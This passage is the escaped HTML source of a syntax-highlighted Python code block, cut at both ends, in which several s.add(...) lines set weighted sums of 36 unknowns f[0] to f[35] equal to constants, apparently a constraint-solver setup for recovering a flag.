style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10472&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6560&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; &lt;span 